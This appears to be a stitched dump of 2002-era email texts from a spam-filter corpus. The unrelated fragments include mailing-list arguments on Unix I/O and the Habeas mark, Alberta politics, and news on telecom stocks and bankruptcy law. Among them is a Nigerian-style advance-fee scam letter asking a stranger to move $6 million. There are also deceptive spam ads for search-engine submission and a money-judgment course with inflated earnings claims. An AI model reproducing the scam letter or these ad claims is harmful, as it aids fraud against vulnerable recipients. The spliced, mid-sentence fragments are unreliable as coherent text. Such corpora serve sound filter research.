 basis for most typical mailing lists (Lockergnome, say) to afford it.

 Sorry, that just can't work.
 
 If the Habeas mark actually becomes both widespread enough in non-spam,
 and effectively-enforced enough to be absent from spam, such that, e.g.,
 SA could assign a positive score to messages that do NOT have it, then
 spammers are out of business and Habeas has no one to sue.  There's nobody
 left to charge except the people who want (or are forced against their
 will because their mail won't get through otherwise) to use the mark.
 
 Conversely, if there are enough spammers forging the mark for Habeas to
 make all its income suing them, then the mark is useless for the purpose
 for which it was designed.
 
 Either way it seems to me that, after maybe a couple of lawsuits against
 real spammers and a lot of cease-and-desist letters to clueless Mom&Pops,
 then either (a) they're out of business, (b) they have to sell the rights
 to use the mark to increasingly questionable senders, or (c) they've both
 created and monopolized a market for ""internet postage stamps"" that
 everybody has to pay them for.
 
 The latter would be quite a coup if they [*] could pull it off -- they do
 absolutely nothing useful, unless you consider threatening people with
 lawsuits useful, yet still collect a fee either directly or indirectly
 from everyone on the internet -- effectively we'll be paying them for the
 privilege of policing their trademark for them.  I don't believe they'll
 ever get that far, but I don't particularly want to help them make it.
 
 [*] And I use the term ""they"" loosely, because the whole company could 
 consist of one lawyer if it really got to that point.

 Alberta, and to a lesser extent some of the other Western provinces, is
 definitely not happy with the current arrangement.  Some of this has to
 do with the strange way the Canadian government is structured.  When I
 was last up in Alberta (a month ago), the newspapers were reporting
 something like 70% of Albertans favor separating from Canada, and over
 several distinct issues.
 
 The problem is basically that while Alberta is an economic powerhouse
 that is propping up the weaker economies of the Eastern provinces, their
 interests are openly and unapologetically ignored by the government in
 Ottawa.  While Alberta sends something like twice the tax dollars to
 Ottawa per capita of the average Canadian, they only have token
 representation in the federal government.  While I'm not clear on
 exactly how the government works up there, representation is not
 entirely based on population, and it works out that some eastern
 provinces with populations smaller than the city of Calgary alone have
 substantially more representatives in the legislature than the entire
 province of Alberta.  
 
 The long and the short of it is that the eastern provinces use Alberta
 as a personal ATM machine for their social programs while not even so
 much as throwing Alberta a bone, and are able to do so because even the
 sparsely populated eastern provinces can out-vote Alberta despite having
 fewer people.  Or something like that.  The Canadian government is less
 restricted than the US government, so they can do strange things, like
 having restrictive regulations that only apply to certain provinces,
 Alberta being on the receiving end of many such obscenities.  It is
 essentially a much worse version of what is happening in the
 inter-mountain West of the US.  Unlike the US case though, the rest of
 Canada would really be hurting if they weren't receiving all those tax
 dollars from Alberta.  OTOH, Alberta would probably thrive.
 
 I have friends in Alberta, and visit occasionally, but I'm not totally
 clear on everything that goes on in that country, due to my partial
 unfamiliarity with how the government works up there, so I'm a little
 fuzzy on some of the details.  What I do know is that on average the
 Albertans are quite unhappy with their current position in Canada and
 the sentiment has been getting worse over the years.
 
 Cheers,

 Absolutely, and I've wanted to recapture it.  I've done some writing based

 KEVIN GEORGE
 
 ABIDJAN,COTE D'IVORIE
 WEST AFRICA
 
 Dearest one,
 
 Although we have not met, I got your contact through the internet and  decided to contact you for assistance. I was, until recently, a final  year engineering student of the University of Sierra Leone,West Africa.  Early in January last year, the rebels
 in my country struck our township and killed my parents in one of their attacks. My late father, King Christopher George being the King of the Town was a prime target.
 
 Fortunately for me, I was in school when the attack took  place. I equally lost my only sister to the rebels. When I got home for the remains of my parents and the subsequent burial that followed, I discovered a document indicating that my late father had deposited some $6M.United States Dollars(six million united states dollars) with one of the private security company here in abidjan cote d'ivorie. This money, according to the docement, was meant for the building of an Auto repair company for me by my late father,when I complete my studies. Upon the discovery of this document, I travelled to the cote d'ivorie to trace the concerned security company and to make claims for the said money as the only surviving next
 of kin to my father.
 
 But deliberatley, I have decided to keep all my uncles and Aunts out of the issue as none of them will be happy to know I am in possession of such money. I have succeded in making the people at the security company believe that I am the next of Kin and all the documents related to are now with me. I do not know what to do with it but I have decided to contact you to seek your assistance in helping me to take it outfrom the security company and transfer it  to your account and help me to come to your country to continue my education and so that you will help me to get the money invested until such a
 time that I will be ready to begin to use it. I am really desperate as I am left alone now in the world.Let me know what you want as compensation for helping
 me to solve this my problem. Most importantly,Iseriously appeal that you maintain high level of secrecy and confidentiality in the whole thing.
 Please you can call me wilth is number 00225-075-03684
 I remain yours sincerely,
 
 KEVIN GEORGE

 Well, DUH!!!
 
 It is perfectly obvious that (heterosexual) promiscuity is exactly,

 Should it be 38K4 - a fairly common baudrate for serial port
 connections? Though if you are getting this much, the baudrate
 may be right. It looks like high ASCII so it may also be worth

     *Interviewer:* If the Boing Boing zine and blog were TV characters, who'd 
     they be, and how'd they get on? 
 
     *Mark:* The zine would be Jethro Bodine of ""The Beverly Hillbillies"" -- 
     curious, neophilic, xenophilic, gleeful, and eager to adopt any new theory 
     or conspiracy as the absolute truth. The Blog would be Sherman from 
     ""Peabody's Improbable History"" -- a traveler of time and space in search of 
     beauty, truth, and the outre. I think Jethro bOING bOING and Sherman Boing 
     Boing would be great pals. Jethro would invite Sherman's dog, Mr. Peabody, 
     to go raccoon hunting with him, and Sherman would send Jethro 40 years into 
     the future to hang out at the Playboy Mansion.

 Yep.  The primary reason I released this, was to provide a good, big
 corpus for academic testing of filter systems; it allows results to
 be compared between filters using a known corpus.
 
 For SpamAssassin development, everyone has to maintain their own corpus.

 If I have an instance of exmh running, the folder I'm visiting will have
 its new, correct .xmhcache overwritten with an incorrect one when I switch

 <font size=3><b>Techs fall again with telecoms, Dow drops below 8K</b></font><br>
 The day after WorldCom Group filed for bankruptcy protection, telecom shares suffered and helped drag down the tech sector.
 <p>
 BellSouth stock tumbled 18.07 percent after it missed Wall Street's earnings target and offered a worse-than-expected outlook.  With shares of SBC Communications, Qwest Communications International, Sprint and AT&T also dropping, CNET's Tech index shed 48.86 points, or 5.3 percent, to 897.37. The tech-heavy Nasdaq composite index fell 36.5 points, or 2.77 percent, to 1,282.55.
 <p>
 With a report raising questions about Citigroup and J.P. Morgan Chase & Co.'s role in the Enron fiasco, broader markets lost ground as well. After a see-saw session, the Dow Jones industrials ended down 234.7 points, or 2.93 percent, to 7,784.5. The S&P 500 slid 27.90 points, or 3.29 percent, to 819.85.

 BellSouth Corp., the No. 3 U.S. local telephone company, on Monday posted lower second-quarter profits due to slack demand and turbulent economic conditions in North America and Latin America.
 
 BellSouth, the dominant local telephone company in nine Southeastern states from Kentucky to Florida, said net income fell to 16 cents a share from 47 cents a year earlier. <br><B>BELLSOUTH CORP 22.61 -18.11% </B>

 WorldCom Inc.'s bankruptcy filing is only the latest in a long line of sad news for a slumping telecom industry grappling with soft demand, falling earnings and worries about accounting.
 
 And things are not likely to change any time soon, as signaled by BellSouth Corp.'s disappointing second-quarter earnings and downward revision to its full-year outlook, analysts and investors said on Monday.<br><B>WORLDCOM INC-WORLDCOM TRCK STK 0.14 55.56% </B>

 In separate court cases, a Florida jury dinged Gateway for sending phone calls to the wrong business, and a federal court in Houston issued an injunction barring Emachines from selling products that infringe on Hewlett-Packard patents.
 A jury in Florida ruled last week that Gateway must pay $3.6 million for a typo in which it sent customers with a PC problem to an 800 number owned by Pensacola, Fla.-based Mo' Money Associates instead of the company's own complaint line, which had a similar number but with an 888 prefix.<br><B>HEWLETT-PACKARD CO 12.00 -6.25% </B>

He anticipates earnings guidance for the current quarter of 15-20 cents per share.

 Tyco International Ltd.'s earnings release on Tuesday may very well be the last for Chief Financial Officer Mark Swartz, whose tenure has been marred by his close association with the conglomerate's disgraced former chairman.
 Named CFO in 1995, Swartz has been the chief defender of Tyco's accounting, which has drawn fire for being opaque and misleading. But perhaps more important, Swartz was a key adviser and architect in Dennis Kozlowski's decade-long acquisition binge to build Tyco into one of the world's largest manufacturing conglomerates.<br><B>TYCO INTERNATIONAL 11.85 -5.12% </B><br>

  Your Shop Web Site is 
 NOT Being SEEN
 WHY? 
 NO ONE CAN FIND IT!
 
 YOUR web site is NOT on many search engines and at the Bottom of their listings and as a result
 
 YOU are LOSING customers who cannot find you!
 
 Can this be changed? YES!

 Think about it!
 Just as you have a web designer to build your site and a company to host your site,does it not make sense to use a company that specializes in professionally submitting your web site. 
 Getting your web site FOUND and SEEN!
 
 
  A Shocking Fact!
 Your web site designer and your host are NOT responsible for getting your web site seen!  Yes, they may submit your site to a few search engines periodically but to stay on the TOP of the search engines is an aggressive business.
 
 Getting onto the search engines and at the top of their listings doesn't  just happen.
 
 You have to be put there!
 
 What the.Net, The Internet Magazine 8/2000 said:
 ""You have your web site designed and have sorted out the maintenance and waiting for the business to roll in, but there's one small problem.... No one knows!""
 
 You need a professional company to do it!
 
 Your Money Back
 Guarantee! 
 If you do not receive confirmation from the search engines that we submit your web site to, we will give you your money back! Guaranteed!
 
 There is nothing to lose!

 Web Site Facts
 Remember ""The Yellow Pages"" Rule! 
  A search engine is like an enormous ""yellow pages"" with thousands of companies advertising the same product.  Unless you are near the front of the listing your chances of a customer actually seeing you is remote.  Unlike a literal yellow pages there is a way to move YOU to the front and also get you on all of the ""Yellow pages"" in the world.
 
 What does it take to be seen on the 
 Search Engines?
 
 Appreciate the Three Golden Rules
 q Search engines do not pull up the web sites at random they use a specific method of search. Those that know them are the ones at the top, those that do not are buried at the bottom! 
 q Your web site must be submitted to the search engines every month otherwise your site gets pushed off (Its a bit like a Ferris wheel, you get on and then after a while you are taken off unless you get another ticket and get back on).
 q Understand the importance of Keywords, Meta tags, and Titles employed when submitting your site to the search engines! 
 Use the right ones and you go up.
 Get it wrong and you go to the bottom!
 Some feel that it is enough to be on the large search engines. 
 Wrong! The problem is because of their sheer size most web sites get buried.  Having your web site professionally submitted can boost you up the listings of these larger search engines, so you can be found on them.  Also many people use the smaller search engines and if your site is professionally submitted your chances of getting to the top are greatly increased. 
 
 It is essential to be on them!
 
 Having Regal Telecom expertly submit your web site every month to worlds search engines will give YOU the Advantage you need. 
  This can make the difference between new customers 
 FINDING your web site or NOT!

 Yup...  In this case, I had two issues.  1. I mirrored the disk to give to
 someone else to work on but the box he has available has only a P1 or P2
 processor.  2. My celeron box has been crashing the backup software so I
 wanted to try out the backup in a different box to make sure it's hardware
 related.  Again, it's also an interesting exercise...

 Oh, I'm doing that too.  This is going to Africa so I'm aiming for as
 robust as possible with belt, braces and probably an all-in-one jumpsuit!
 I'll be mirroring the disk but that is worth only so much (eg. lightning
 strike taking out the disk(s) or system compromise)  I'm also going for a
 backup to CDR with an automated restore http://www.mondorescue.org .  The
 admin out there wouldn't be able to build the system again if the mobo got
 fried and the replacement was the wrong arch but an i386 compatible
 install will mean just dropping in the HD and booting (ish)...

","URL: http://diveintomark.org/archives/2002/10/03.html#when_an_engineer_flaps_his_wings
 Date: 2002-10-03T01:31:51-05:00
 
 Remember that saying from chaos theory about how when a butterfly flap its 
 wings, it can cause a hurricane a month later halfway around the world? As 
 several people have already noted, Google has made some major changes in their 
 most recent update. The weblogging community was hit hard (for instance, I used 
 to be the #1 ""mark""[1]; I am now #6). The changes appear to be the result of an 
 attempt to stop two phenomena: explicitly selling ads based on PageRank[2], and 
 Google bombing[3]. 
 
 Specifically, Google is now apparently cross-checking link text with the linked 
 site, and discounting or ignoring links whose text does not appear in the 
 linked site. This all but kills off Google bombing. Searching for ""go to hell""
 [4] no longer takes you to microsoft.com[5]; searching for ""talentless hack""[6] 
 no longer finds ohmessylife.com[7], although it finds a lot of people who were 
 previously participating in the Google bombing. No definitive word yet on 
 whether Google is actively penalizing such sites. 
 
 Unfortunately, the algorithm tweaks necessary to stop these two techniques have 
 caused a wide range of collateral damage, apparently coming down hardest on 
 medium-to-large sites that had previously been doing everything right (as far 
 as page structure, link structure, accessibility, and general honest hard work 
 putting together a usable and useful site). The Webmasterworld forums are alive 
 with complaints and speculation: 
 
 - New update, pagerank death?[8] 
 - September 2002 Google Update Discussion - part 1[9] 
 - Let's find out what happened - Sept 2002 Update - pt. 2[10] 
 
 (Side note: amongst the confusion, it has been suggested that Google is no 
 longer indexing ALT text in images. I can confirm that this is absolutely 
 false. Searching diveintomark.org for ""gimli""[11] finds my entry of July 29[12]
 , where ""Gimli"" is mentioned only in the ALT text of an image.) 
 
 Regardless, Google's search results in general appear to be significantly 
 degraded in many key areas. The forums are full of people complaining that spam 
 sites, doorway pages, and obvious cloaking attempts, which Google used to be so 
 good at filtering out, are now popping up in top spots with disturbing 
 frequency. Nobody in the forums wants to talk about which keywords they're 
 tracking, so I tried to find my own concrete example of crap search results. It 
 didn't take long. 
 
 - Searching for reservation hotel[13] brings up an empty sub-page[14] of a 
 hotel reservation company in Italy[15] as the first result. This seems 
 unhelpful, and unlikely to be relevant to the average US-based consumer (and 
 Google absolutely knows I'm in the US based on my IP address). 
 - Searching for news observer nc[16] (the News & Observer is a Raleigh, NC 
 newspaper) does find The News & Observer[17], but it also finds an Internet 
 betting spam page[18] at #7 and a non-existent page[19] at #9. 
 - Searching for eminem[20] gives us two generic portal pages, a non-existent 
 site, and a site that redirects to a site that continuously redirects to itself 
 (I am not making this up). And this is just on the first page. Good thing I 
 didn't care that much about Eminem to begin with, because Google just isn't 
 that helpful. 
 
 Many people in the Webmasterworld forums are now suggesting that AllTheWeb.com
 [21] has better search results overall. Just as a single comparison, their 
 results for ""eminem""[22] do appear to be much more relevant. Is this the 
 beginning of the end of Google's reign?

816,"Subject: [NYT] A Sudden Rush to Declare Bankruptcy is Expected
","Welcome to 2002.  Companies that have taken on way too much debt can
 screw their shareholders and even some of their debt-holders by
 declaring bankruptcy, as Enron and Worldcom have done; meanwhile,
 it becomes more difficult for individuals who have similarly taken on
 too much debt, to dig their way out of their own holes...
 
 In my next life, I'm coming back as a corporation.  They get all the
 perks. :)
 
 
 http://www.nytimes.com/2002/07/27/business/27BANK.html
 
 A Sudden Rush to Declare Bankruptcy Is Expected
 By PHILIP SHENON
 
 WASHINGTON, July 26 The compromise bill, which was approved on Thursday
 by Congressional negotiators and is expected to be adopted in both the
 House and Senate by the end of next week, will make it much harder for
 Americans to wipe out their debts when they declare bankruptcy.
 
 After the agreement, lawyers around the country said that they had begun
 to receive calls and visits from debtors worried that they needed to
 file bankruptcy before the old rules lapse next year.
 
 ""I've had plenty of calls this morning,"" said Gary F. Weltmann, a
 consumer bankruptcy lawyer in Washington. ""And I'm telling people that
 they need to take action now.""
 
 Marty K. Courson, a bankruptcy lawyer in San Francisco, said he was
 ""getting ready for the onslaught.""
 
 ""I do think there will be a lot of people trying to use the old rules,""
 he said.
 
 The White House announced today that President Bush would sign the bill,
 which was scheduled for a final vote in the House late tonight and in
 the Senate next week. 
 
 ""The president looks forward to signing that,"" said Ari Fleischer, the
 White House spokesman. ""That bill enjoys widespread bipartisan support
 for good reasons."" 
 
 The bill, which had been stalled until this week in a House-Senate
 conference committee, passed both chambers by overwhelming margins more
 than a year ago. The conference committee approved the bill Thursday
 after agreeing on an abortion-rights provision that had been the final
 obstacle to passage; the provision will bar anti-abortion protesters
 from using the bankruptcy laws to avoid paying court judgments as a
 result of clinic protests.
 
 The bill has long been the top legislative priority of the credit card
 and banking industries, which say that many people now abuse the
 bankruptcy system by writing off debts that they should be able to
 pay. There were 1.45 million bankruptcy filings last year, a record, up
 19 percent from 2000.
 
 ""This legislation restores integrity and accountability to our
 bankruptcy system by offering a fresh start to those who deserve one
 while cracking down on those who don't,"" said Representative F. James
 Sensenbrenner Jr., the Wisconsin Republican who is chairman of the House
 Judiciary Committee.
 
 Critics, including top consumer-rights groups, described the bill as a
 gift to lenders in exchange for a recent, drastic increase in campaign
 contributions to members of Congress. They also said that it would do
 harm to millions of Americans in financial distress as a result of lost
 jobs, poor health or divorce.
 
 The bill's opponents have also questioned the timing of its passage,
 which comes in the midst of a Congressional crackdown on abusive
 accounting practices by many of the largest companies, including some of
 the same financial services companies that have lobbied strenuously for
 the bankruptcy bill.
 
 ""The timing couldn't be worse,"" said Travis B. Plunkett, the legislative
 director of the Consumer Federation of America. ""It takes a lot of gall
 for Congress to make a move like this when so many Americans are
 concerned about corporate abuses, and when the economy is so shaky."" 
 
 Senator Paul Wellstone, a Minnesota Democrat who is a leading critic of
 the bill, said today that ""it boggles the mind that at a time when
 Americans are more economically vulnerable, when they are most in need
 of protection from financial disaster, we would eviscerate the major
 financial safety net in our society for the middle class.""
 
 Bankruptcy lawyers said that the bill would do harm to low- and
 middle-income clients who would be saddled with debts that would take
 them years to pay back. The new law will end the debt-free ""fresh start""
 that many of those debtors had been permitted under the current law.
 
 Recent studies have shown that the average American filing for
 bankruptcy has a median household income well below the national average
 of about $42,000 in 2000. A study cited in Congressional testimony last
 year showed that the average person filing for bankruptcy had a car that
 was six to nine years old, and that a quarter of those people had
 medical debts exceeding $1,000.
 
 ""I won't deny that there are people who abuse the bankruptcy system,""
 said Mr. Weltmann, the Washington lawyer whose firm calls itself the
 Bankruptcy Center. ""But there are honest, hard-working folks who are
 really going to be affected by these changes.""
 
 The bill would impose a means test on debtors, based on median incomes
 in their home states, for bankruptcy filings under Charter 7 of the
 federal bankruptcy law, which permits debtors to erase most of their
 unsecured debts, like credit card bills.
 
 Debtors with an income above the state median would be barred from
 filing under Chapter 7 and would instead be required to file instead
 under Chapter 13, which requires that a portion of the unsecured debt be
 repaid over time under the court-administered plan.
 
 Mr. Courson, the San Francisco lawyer, said that the changes would ""hurt
 a lot of consumer debtors who really, rightfully belong in Chapter 7.""
 
 ""My clients, for the most part, are honest and unfortunate people, and
 they've just got heavy debt,"" he said. ""You can always find some
 circumstance where a person really went to town with a credit card and
 got themselves in trouble. But I have people who are just plain old
 poor. My experience is something wildly different than the story that
 the credit card companies make to Congress.""

 At its peak, there were more than 100 peer-to-peer start-ups. There now
 remain, at most, a couple of dozen companies concentrated in a few
 niches. The main activity of companies venturing into peer to peer is
 file sharing. But the dozens of overoptimistic forays into alternative
 economic systems, hyper-sophisticated technologies, and recording
 industry collaboration turned out to be dead ends.  Peer-to-peer
 auctions, peer-to-peer supply chain management, and peer-to-peer e-mail
 may have failed because they were ahead of their time. It's more likely
 they failed because they were just ahead of themselves.  Clearly, the
 public's appetite for file sharing has increased, and the state of the
 art has improved dramatically. But companies have still not yet found
 satisfactory business models, thus leaving file sharing's last chapter
 unwritten.

 XML proxies are add-ons to firewall and network environments that have
 the ability to monitor XML traffic and apply business rules and IT
 policies such as security, routing, performance, management,
 transformation, and connection provisioning.  Current firewalls aren't
 able to peek in the envelope and decipher XML traffic, said report
 author Ronald Schmelzer, ZapThink senior analyst.  XML proxies are not
 only able to understand network protocols, but also the XML-based
 content traveling on top of those protocols, Schmelzer said.  ZapThink
 identifies a slew of new vendors with XML-ready security solutions,
 including Flamenco Networks, Forum Systems, Reactivity, Vordel, and
 Westbridge Technology, among others... ZapThink estimates that XML
 represents just 2 percent of network traffic today, but that will
 increase to almost 25 percent by 2006.

 <BR>
 If you are like many people, you are not even sure what a<BR>
 Money Judgment is and </FONT>
 <FONT color=3D""#0000A0""> why processing Money Judgments<BR>
 can earn you very substantial income</FONT>
 <FONT color=3D""#000000"">  .<BR>
 <BR>
 If you ever sue a company or a person and you win then you<BR>
 will have a Money Judgment against them.<BR>
 <BR>
 You are happy you won but you will soon find out the<BR>
 shocking fact: ""Its now up to you to collect on the<BR>
 Judgment"". The court does not require the loser to pay you.<BR>
 The court will not even help you. You must trace the loser<BR>
 down, find their assets, their employment, bank accounts,<BR>
 real estate, stocks and bonds, etc.<BR>
 <BR>
 Very few people know how to find these assets or what to do<BR>
 when they are found. The result is that millions of<BR>
 Judgments are just sitting in files and being forgotten.<BR>
 <BR>
 ""In 79% of the cases the winner of a Judgment never sees a<BR>
 dime.""<BR>
 <BR>
 The non-payment of judicial debt has grown to epidemic<BR>
 proportions. Right now in the United States there is<BR>
 between </FONT>
 <FONT color=3D""#0000A0""> 200 and 300 billion dollars of uncollected Money<=
 BR>
 Judgment debt</FONT>
 <FONT color=3D""#000000"">  . For every Judgment that is paid, 5 more<BR>
 Judgments take its place.<BR>
 <BR>
 We identified this massive market 8 years ago and have<BR>
 actively pursued Judicial Judgments since. We invented this<BR>
 business. We have perfected it into a well proven and solid<BR>
 profession in which only a select few will be trained in the<BR>
 techniques necessary to succeed.<BR>
 <BR>
 With our first hand experience we have built a course which<BR>
 teaches you how to start your business in this new unknown<BR>
 and exciting field of processing Money Judgments.<BR>
 <BR>
 By following the steps laid out in our course and with<BR>
 reasonable effort you can become very successful in the<BR>
 processing of Money Judgments.<BR>
 <BR>
 The income potential is substantial in this profession. </FONT>
 <FONT color=3D""#0000A0""> We<BR>
 have associates who have taken our course and are now<BR>
 working full time making $96,000.00 to over $200,000.00 per<BR>
 year. Part time associates are earning between $24,000.00<BR>
 and $100,000.00 per year </FONT>
 <FONT color=3D""#000000""> . Some choose to operate out of<BR>
 their home and work by themselves. Others build a sizable<BR>
 organization of 15 to 25 people in attractive business<BR>
 offices.<BR>
 <BR>
 Today our company and our associates have over 126<BR>
 million dollars in Money Judgments that we are currently<BR>
 processing. Of this 126 million, 25 million is in the form<BR>
 of joint ventures between our firm and our associates.<BR>
 Joint ventures are where we make our money. We only break<BR>
 even when our course is purchased. We make a 12% margin on<BR>
 the reports we supply to our associates. Our reporting<BR>
 capability is so extensive that government agencies, police<BR>
 officers, attorneys, credit agencies etc., all come to us<BR>
 for reports.<BR>
 <BR>
 <BR>
 Many of our associates already have real estate liens in<BR>
 force of between 5 million to over 15 million dollars.<BR>
 Legally this means that when the properties are sold or<BR>
 refinanced our associate must be paid off. The norm is 10%<BR>
 interest compounded annually on unpaid Money Judgments.<BR>
 Annual interest on 5 million at 10% translates to<BR>
 $500,000.00 annually in interest income, not counting the<BR>
 payment of the principal.<BR>
 <BR>
 Our associates earn half of this amount or $250,000.00 per<BR>
 year. This is just for interest, not counting principle<BR>
 and not counting the compounding of the interest which can<BR>
 add substantial additional income. Typically companies are<BR>
 sold for 10 times earnings. Just based on simple interest<BR>
 an associate with 5 million in real estate liens could sell<BR>
 their business for approximately 2.5 million dollars.<BR>
 <BR>
 </FONT>
 <FONT color=3D""#0000A0""> 92% of all of our associates work out of their ho=
 me; 43%<BR>
 are women and 36% are part time</FONT>
 <FONT color=3D""#000000"">  .<BR>
 <BR>
 One of the benefits of working in this field is that you are<BR>
 not under any kind of time frame. If you decide to take off<BR>
 for a month on vacation then go. The Judgments you are<BR>
 working on will be there when you return. The Judgments<BR>
 are still in force, they do not disappear.<BR>
 <BR>
 The way we train you is non-confrontational. You use your<BR>
 computer and telephone to do most of the processing. You<BR>
 never confront the debtor. The debtor doesn't know who you<BR>
 are. You are not a collection agency.<BR>
 <BR>
 Simply stated the steps to successful Money Processing<BR>
 are as follows:<BR>
 <BR>
 Mail our recommended letter to companies and individuals<BR>
 with Money Judgments. (We train you how to find out who<BR>
 to write to)<BR>
 <BR>
 8% to 11% of the firms and people you write will call you<BR>
 and ask for your help. They call you, you don't call them<BR>
 unless you want to.<BR>
 <BR>
 You send them an agreement (supplied in the course) to<BR>
 sign which splits every dollar you collect 50% to you and<BR>
 50% to them. This applies no matter if the judgment is for<BR>
 $2,000.00 or $2,000,000.00.<BR>
 <BR>
 You then go on-line to our computers to find the debtor<BR>
 and their assets. We offer over 120 powerful reports to<BR>
 assist you. They range from credit reports from all three<BR>
 credit bureaus, to bank account locates, employment<BR>
 locates, skip traces and locating stocks and bonds, etc.<BR>
 The prices of our reports are very low. Typically 1/2 to<BR>
 1/3 of what other firms charge. For example we charge<BR>
 $6.00 for an individuals credit report when some other<BR>
 companies charge $25.00.<BR>
 <BR>
 Once you find the debtor and their assets you file<BR>
 garnishments and liens on the assets you have located.<BR>
 (Standard fill in the blanks forms are included in the<BR>
 course)<BR>
 <BR>
 When you receive the assets you keep 50% and send 50% to<BR>
 the original Judgment holder.<BR>
 <BR>
 Once the Judgment is fully paid you mail a Satisfaction of<BR>
 Judgment to the court. (Included in the course)<BR>
 <BR>
 Quote's from several of our students:<BR>
 <BR>
 Thomas in area code 516 writes us: ""I just wanted to drop<BR>
 you a short note thanking you for your excellent course. </FONT>
 <FONT color=3D""#0000A0""> My<BR>
 first week, part time, will net me 3,700.00 dollars</FONT>
 <FONT color=3D""#000000"">  . Your<BR>
 professionalism in both the manual and the video opened<BR>
 doors for me in the future. There's no stopping me now.<BR>
 Recently Thomas states he has over $8,500,000 worth of<BR>
 judgments he is working on.<BR>
 <BR>
 After only having this course for four months, Larry S. in<BR>
 area code 314 stated to us: "" </FONT>
 <FONT color=3D""#0000A0""> I am now making $2,000.00 per<BR>
 week </FONT>
 <FONT color=3D""#000000""> and expect this to grow to twice this amount with=
 in the<BR>
 next year. I am having a ball. I have over $250,000 in<BR>
 judgments I am collecting on now.""<BR>
 <BR>
 After having our course for 7 months Larry S. in 314 stated<BR>
 "" </FONT>
 <FONT color=3D""#0000A0""> I am now making $12,000.00</FONT>
 <FONT color=3D""#000000"">  per month and have approximately<BR>
 $500,000.00 in judgments I am collecting on. Looks like I<BR>
 will have to hire someone to help out""<BR>
 <BR>
 Marshal in area code 407 states to us ""I feel bad, you only<BR>
 charged me $259.00 for this course and it is a goldmine. I<BR>
 have added 3 full time people to help me after only having<BR>
 your course for 5 months""<BR>
 <BR>
 >From the above information and actual results you can see<BR>
 why we can state the following:<BR>
 <BR>
 With our course you can own your own successful business.<BR>
 A business which earns you substantial income now and one<BR>
 which could be sold in 3-5 years, paying you enough to<BR>
 retire on and travel the world. A business which is<BR>
 extremely interesting to be in. A Business in which every<BR>
 day is new and exciting.<BR>
 <BR>
 None of your days will be hum-drum. Your brain is<BR>
 Challenged. A business, which protects you from Corporate<BR>
 Downsizing. A business which you can start part time from<BR>
 your home and later, if you so desire, you can work in full<BR>
 time. A business, which is your ticket to freedom from<BR>
 others telling you what to do. A business, which lets you<BR>
 control your own destiny. Our training has made this happen<BR>
 for many others already. Make it happen for you!<BR>
 <BR>
 If the above sounds interesting to you then its time for you<BR>
 to talk to a real live human being, no cost or obligation<BR>
 on your part.<BR>

824,"Subject: Football players addicted to video football
","URL: http://boingboing.net/#85531549
 Date: Not supplied
 
 Pro football players are addicted to football games, as a means of 
 wish-fulfillment -- by ""managing"" the team, they can be free of the rule of 
 their coaches and bosses. Maybe this explains the amazing success of The Sims, 
 which, on the face of it, should be dull as hell: While away your free time 
 away from the office by simulating an existence as a shlub with a day-job and a 
 drive to acquire consumer goods on credit. You'd think it'd be the last thing 
 you want to do. But it's not. When you're a Sim, you can tweak your existence a 
 smidge, discover what life would be like if you took Path A instead of Path B, 
 try the alternate universe on for size. The idea of football players playing 
 themselves in licensed video games is neat and recursive, like the episode of 
 the Simpsons when Mr. Burns runs into Krusty buying Krusty-O's at the 
 supermarket and asks where he can find the ""Burns-O's."" 
 
     ""It's always a trip,"" Carr says. ""The first time I saw myself in a video 
     game was in college (at Fresno State) when I walked into a Best Buy store 
     and some kid was playing with me. That kind of trips you out a little bit."" 
     
 
     For every 12-year-old kid who spends countless hours in front of a 
     television playing video games, there's a group of 300-pound offensive 
     linemen challenging each other at everything from Madden NFL 2003 to the 
     action-packed ""Halo: Combat Evolved.""

","
 PUBLIC ANNOUNCEMENT:
 
 The new domain names are finally available to the general public at discount prices. Now you can register one of the exciting new .BIZ or .INFO domain names, as well as the original .COM and .NET names for just $14.95. These brand new domain extensions were recently approved by ICANN and have the same rights as the original .COM and .NET domain names. The biggest benefit is of-course that the .BIZ and .INFO domain names are currently more available. i.e. it will be much easier to register an attractive and easy-to-remember domain name for the same price.  Visit: http://www.affordable-domains.com today for more info.
  
 Register your domain name today for just $14.95 at: http://www.affordable-domains.com/  Registration fees include full access to an easy-to-use control panel to manage your domain name in the future.
  
 Sincerely,
  
 Domain Administrator
 Affordable Domains

 Depends who writes it.  One guy will write a bug every 5 lines,
 another every 5000 lines.  Put them both on a project and that will
 average out to a bug every 4.995 lines.

 Not only do I know that, the post to which you were responding
 explained that, with somewhat more detail than ""a joke"".  As you
 should know, but evidently don't, poll() isn't even ""a bit better"" ---
 in fact, it's about an order of magnitude worse --- for dense file
 descriptor sets, which is the normal case.  (Except on operating
 systems where select() isn't a system call but a library routine that
 calls poll().)

 You originally said:
 
   Could it be? After 20 years without this feature UNIX finally
   catches up to Windows and has I/O that doesnt [sic] totally suck for
   nontrivial apps? No way!
 
 The point --- my point, the point I was discussing; please don't try
 to tell me you were trying to make a different point, because I don't
 care --- is that you had no clue what you were talking about; Unix
 hasn't been without this feature, and in fact has had it since you
 were in elementary school, and operating systems without it don't
 ""totally suck for nontrivial apps"".
 
 For what it's worth, glibc has actually implemented the aio_* calls
 for a while, just in a way that doesn't scale to large numbers of
 concurrent I/O requests.  I find references to the glibc
 implementation as far back as 1999 and glibc 2.1.1, and I could
 probably find much earlier references if I had time:
 http://sources.redhat.com/ml/libc-hacker/1999-12/msg00070.html
 
 (more details at

 details on the SGI patch are at

 Your original complaint was that Unix didn't do multithreading or
 multiprogramming well.  Now that I've pointed out how obviously
 idiotic that claim is, you've amended your complaint: now, although
 individual Unixes do these things well, you complain that their
 implementations are not entirely conformant with the POSIX threads
 specification.  Well, that's probably true, but I haven't written
 pthreads programs in C much myself, so I can't confirm it from my own
 experience.  But, even if it's true, it's not a very good reason to
 prefer Windows.
 
 I'm sure you can provide examples of bugs in particular threading
 implementations.  Spare us.  Just shut up.

 Every new Mac comes with an upgrade 10.2 CD as of last week.
 So if you bought one on the 12th, you'd be running 10.2 before the release
 this Friday night.

 Good luck with that, even Mac geeks have a longer upgrade cycle than the

 Personally, I don't know where you got that from.  Here's how I
 grokked the whole piece.   A theory (in this case, that fantasy was
 the propagating force/drive?) behind a given act, that from those not
 in the fantasy seems morally outrageous, repugnant or unjustified.
 He listed many examples, oldies and goodies.   I don't think the
 author meant to come off at the point that you seem to be
 conjecturing -- that this is purely an 'other' offense.   I certainly
 didn't read it that way, but it _did_ bother me that he did not
 include some of the examples I listed, or as Damien? mentioned on an
 earlier post, the whole collective fantasy of capitalism.

 This article never got into the bones & blood of what humans are Gary.
   You're assuming too much, dearie.  His was all a psychological game.
